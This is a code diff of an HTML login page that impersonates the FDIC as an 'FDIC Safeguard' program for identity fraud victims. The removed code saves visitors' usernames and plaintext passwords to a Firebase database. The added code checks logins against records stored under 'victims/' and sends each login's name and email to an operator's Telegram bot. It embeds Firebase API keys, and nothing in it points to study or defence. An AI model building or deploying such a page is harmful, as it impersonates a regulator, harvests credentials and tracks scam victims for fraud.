@@ -3,148 +3,247 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FDIC Online Banking Portal</title>
+    <title>FDIC Safeguard - Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --fdic-blue: #003366;
-            --fdic-light-blue: #0056b3;
-            --bg-color: #f4f7f6;
-            --text-dark: #333;
-            --text-light: #666;
-            --white: #ffffff;
-            --border: #e0e0e0;
+            --fdic-gold: #C5B358;
+            --fdic-white: #FFFFFF;
+            --fdic-gray: #F4F4F4;
+            --text-dark: #333333;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        
-        body { background-color: var(--bg-color); color: var(--text-dark); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--fdic-blue);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: var(--text-dark);
+        }
 
         .login-container {
-            background: var(--white);
+            background: var(--fdic-white);
             padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
             width: 100%;
             max-width: 400px;
             text-align: center;
         }
 
-        .logo-area { margin-bottom: 30px; }
-        
-        .fdic-logo-container { display: flex; justify-content: center; margin-bottom: 10px; }
+        .logo-area {
+            margin-bottom: 30px;
+        }
 
-        .login-container h2 { color: var(--fdic-blue); margin-bottom: 10px; font-size: 24px; }
-        .login-container p { color: var(--text-light); font-size: 14px; margin-bottom: 20px; }
+        .logo-area h1 {
+            color: var(--fdic-blue);
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
 
-        .form-group { margin-bottom: 20px; text-align: left; }
-        .form-group label { display: block; margin-bottom: 5px; color: var(--text-dark); font-weight: 500; font-size: 14px; }
-        .form-group input {
+        .logo-area p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #555;
+        }
+
+        .input-group input {
             width: 100%;
             padding: 12px;
-            border: 1px solid var(--border);
+            border: 1px solid #ddd;
             border-radius: 4px;
-            font-size: 14px;
+            font-size: 16px;
             transition: border-color 0.3s;
         }
-        .form-group input:focus { border-color: var(--fdic-blue); outline: none; }
 
-        .btn {
+        .input-group input:focus {
+            border-color: var(--fdic-blue);
+            outline: none;
+        }
+
+        .btn-login {
             width: 100%;
-            padding: 12px;
+            padding: 14px;
             background-color: var(--fdic-blue);
-            color: var(--white);
+            color: var(--fdic-white);
             border: none;
             border-radius: 4px;
             font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
             transition: background-color 0.3s;
         }
-        .btn:hover { background-color: var(--fdic-light-blue); }
 
-        .loader { display: none; color: var(--fdic-blue); margin-top: 10px; font-size: 14px; }
+        .btn-login:hover {
+            background-color: #002244;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.8);
+            text-align: center;
+        }
+
+        .footer a {
+            color: rgba(255,255,255,0.8);
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .error-msg {
+            color: #d9534f;
+            font-size: 14px;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .loader {
+            display: none;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
 
-<div class="login-container">
-    <div class="logo-area">
-        <div class="fdic-logo-container">
-          <svg width="120" height="40" viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M100 5L20 25V55H180V25L100 5Z" fill="#003366"/>
-            <path d="M100 12L30 28V50H170V28L100 12Z" fill="white"/>
-            <text x="100" y="42" font-family="Arial, sans-serif" font-size="24" font-weight="bold" fill="#003366" text-anchor="middle">FDIC</text>
-          </svg>
+    <div class="login-container">
+        <div class="logo-area">
+            <h1>FDIC SAFEGUARD</h1>
+            <p>REGULATORY PROGRAM</p>
+            <p>IDENTITY FRAUD VICTIMS</p>
         </div>
-        <h2>Online Banking Portal</h2>
-        <p>Secure Login for FDIC Insured Accounts</p>
+
+        <div id="errorMsg" class="error-msg">Invalid Username or Password</div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" placeholder="Enter your username" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="btn-login">Sign In</button>
+            <div class="loader">Verifying Credentials...</div>
+        </form>
     </div>
-    
-    <form id="loginForm">
-        <div class="form-group">
-            <label for="username">Username</label>
-            <input type="text" id="username" placeholder="Enter your username" required>
-        </div>
-        <div class="form-group">
-            <label for="password">Password</label>
-            <input type="password" id="password" placeholder="Enter your password" required>
-        </div>
-        <button type="submit" class="btn">Sign In</button>
-        <div class="loader" id="loader">Authenticating...</div>
-    </form>
-</div>
 
-<!-- Firebase SDKs -->
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-  import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-  import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+    <div class="footer">
+        <p>&copy; 2026 Safe Guard Bank. All rights reserved.</p>
+        <p><a href="#">Terms and Conditions</a> | <a href="#">Privacy Policy</a></p>
+    </div>
 
-  // TODO: Replace with your Firebase project configuration
-  const firebaseConfig = {
-  apiKey: "AIzaSyCi1fTBOHYz02MNaVD7aF_1bRlkWu3HgeQ",
-  authDomain: "fdicprotects.firebaseapp.com",
-  projectId: "fdicprotects",
-  storageBucket: "fdicprotects.firebasestorage.app",
-  messagingSenderId: "1087204523962",
-  appId: "1:1087204523962:web:ba359d8cf5981afeab2783"
+    <script type="module">
+        // REPLACE WITH YOUR FIREBASE CONFIG
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+        const firebaseConfig = {
+  apiKey: "AIzaSyBkx-EEG7HdjfIuHkxdWSZrjjFaX-hGy68",
+  authDomain: "fdicsupport-cae27.firebaseapp.com",
+  databaseURL: "https://fdicsupport-cae27-default-rtdb.firebaseio.com",
+  projectId: "fdicsupport-cae27",
+  storageBucket: "fdicsupport-cae27.firebasestorage.app",
+  messagingSenderId: "874213007292",
+  appId: "1:874213007292:web:bf04711a109df8c85b95b9"
 };
 
-  const app = initializeApp(firebaseConfig);
-  const auth = getAuth(app);
-  const db = getDatabase(app);
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
 
-  document.getElementById('loginForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const loader = document.getElementById('loader');
-      
-      loader.style.display = 'block';
+        const loginForm = document.getElementById('loginForm');
+        const errorMsg = document.getElementById('errorMsg');
+        const loader = document.querySelector('.loader');
 
-      try {
-          // Check if user exists in DB, if not create them (Simple Auth)
-          const userRef = ref(db, 'users/' + username);
-          const snapshot = await get(userRef);
-          
-          if (snapshot.exists()) {
-              // If password matches simple check or use Firebase Auth
-              // For simplicity, we'll just redirect if username exists in DB
-              window.location.href = 'dashboard.html';
-          } else {
-              // Create new user in DB
-              await set(userRef, {
-                  username: username,
-                  password: password, // In production, hash this!
-                  createdAt: new Date().toISOString()
-              });
-              window.location.href = 'dashboard.html';
-          }
-      } catch (error) {
-          alert("Login Error: " + error.message);
-          loader.style.display = 'none';
-      }
-  });
-</script>
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            errorMsg.style.display = 'none';
+            loader.style.display = 'block';
 
+            try {
+                // 1. Fetch Config for Telegram
+                const configRef = ref(db, 'config/telegram');
+                const configSnapshot = await get(configRef);
+                const telegramConfig = configSnapshot.exists() ? configSnapshot.val() : { botToken: '', chatId: '' };
+
+                // 2. Fetch User Data
+                const userRef = ref(db, 'victims/' + username);
+                const userSnapshot = await get(userRef);
+
+                if (userSnapshot.exists()) {
+                    const userData = userSnapshot.val();
+                    
+                    // Check Password
+                    if (userData.password === password) {
+                        // 3. Send Telegram Notification
+                        if (telegramConfig.botToken && telegramConfig.chatId) {
+                            const message = `🚨 New Login Alert!\n\nVictim: ${userData.firstName || 'Unknown'} ${userData.lastName || ''}\nEmail: ${userData.email || 'N/A'}\nTime: ${new Date().toLocaleString()}`;
+                            const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`;
+                            
+                            fetch(url, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: telegramConfig.chatId,
+                                    text: message
+                                })
+                            }).catch(err => console.log('Telegram Error:', err));
+                        }
+
+                        // 4. Redirect to Dashboard with User Data
+                        // Using sessionStorage to pass data simply without complex routing
+                        sessionStorage.setItem('currentUser', JSON.stringify(userData));
+                        sessionStorage.setItem('currentUsername', username);
+                        window.location.href = 'dashboard.html';
+                    } else {
+                        errorMsg.textContent = "Invalid Username or Password";
+                        errorMsg.style.display = 'block';
+                        loader.style.display = 'none';
+                    }
+                } else {
+                    errorMsg.textContent = "Invalid Username or Password";
+                    errorMsg.style.display = 'block';
+                    loader.style.display = 'none';
+                }
+            } catch (error) {
+                console.error("Login Error:", error);
+                errorMsg.textContent = "System Error. Please try again.";
+                errorMsg.style.display = 'block';
+                loader.style.display = 'none';
+            }
+        });
+    </script>
 </body>
 </html>
